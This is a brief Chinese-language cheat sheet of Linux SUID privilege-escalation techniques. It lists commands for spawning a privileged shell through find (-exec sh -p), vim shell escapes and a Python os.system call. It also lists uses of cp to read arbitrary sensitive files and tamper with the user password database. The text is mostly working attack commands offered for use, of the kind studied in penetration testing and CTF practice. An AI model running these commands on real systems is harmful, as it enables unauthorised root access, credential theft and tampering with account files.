witch 命令;查看命令目录
ls -l 命令目录;查看命令目录是否为suid权限
1.find . -name 文件名 -exec sh -p \;
    保留权限启动sh
2.vim
    :!ls -p
    进入vim后!+命令
    无交互终端就直接vim -c ':!命令' -c 'q!'
3.python
    python -c 'import os; os.system("/bin/sh")'
4.cp
    1.读任意文件,将敏感信息读出来
    2.篡改用户密码库